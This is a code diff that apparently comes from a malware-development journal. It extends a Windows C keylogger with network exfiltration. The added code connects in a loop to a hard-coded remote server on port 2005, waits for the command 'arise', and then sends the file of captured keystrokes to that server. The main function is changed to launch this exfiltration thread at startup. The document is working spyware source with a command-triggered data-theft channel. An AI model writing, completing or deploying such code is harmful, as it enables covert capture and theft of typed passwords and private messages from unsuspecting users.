@@ -1,7 +1,71 @@
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
+#include <winsock2.h>
+#include <windows.h>
 
+
+#define SERVER_IP "192.168.1.13"  // Change this to the Linux server IP
+#define SERVER_PORT 2005
+#define BUF_SIZE 1024
+
+DWORD WINAPI send_logs(LPVOID lpBuffer) {
+    FILE *fp;
+    char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\keylogger.txt";
+    char buffer[BUF_SIZE];
+    int bytes_sent;
+    SOCKET sock = *(SOCKET*)lpBuffer;
+    
+    if ((fp = fopen(filename, "r")) == NULL) {
+        printf("Error opening file\n");
+        return -1;
+    }
+    while ((bytes_sent = fread(buffer, sizeof(char), BUF_SIZE-1, fp)) > 0) {
+        send(sock, buffer, bytes_sent, 0);
+    }
+    if (bytes_sent == 0) {
+        printf("File transfer complete\n");    
+    } else {
+        printf("Error sending file\n");
+        return -1;
+    }
+    fclose(fp);
+    return 1;
+}
+
+
+
+DWORD WINAPI connect_to_server(LPVOID arg) {
+    WSADATA wsaData;
+    SOCKET sock;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    struct sockaddr_in server;
+    char buffer[BUF_SIZE];
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = inet_addr(SERVER_IP);
+    server.sin_port = htons(SERVER_PORT);
+    
+    while(1){
+        int conn = 1;
+        while(conn){
+        conn = connect(sock, (struct sockaddr *)&server, sizeof(server));
+        Sleep(1000);
+        }
+        HANDLE recieve;
+        int len;
+        while((len = recv(sock, buffer, sizeof(buffer), 0)) > 0 && !conn) {
+            buffer[len] = 0;
+            if (strcmp(buffer, "arise") == 0) {
+                recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
+            }
+        }
+            // Cleanup
+        closesocket(sock);
+    }
+    WSACleanup();
+    return 1;
+}
 // Function to save logs to a file
 void save_to(const char *filename, const char *message) {
     FILE *fp = fopen(filename, "a");
@@ -16,6 +80,7 @@ void save_to(const char *filename, const char *message) {
     fprintf(fp, "%s", message);
     fclose(fp);
 }
+
 
 // Map special keys with Shift pressed
 char map_special_shifted(int key) {
@@ -50,7 +115,7 @@ int main() {
 
     char message[64];       // Buffer for logging messages
     int lastKeyState[256] = {0}; // Array to track key states
-
+    CreateThread(NULL, NULL,connect_to_server, NULL, 0, NULL);
     while (1) {
         for (int i = 0; i < 256; i++) {
             // Check if key is pressed
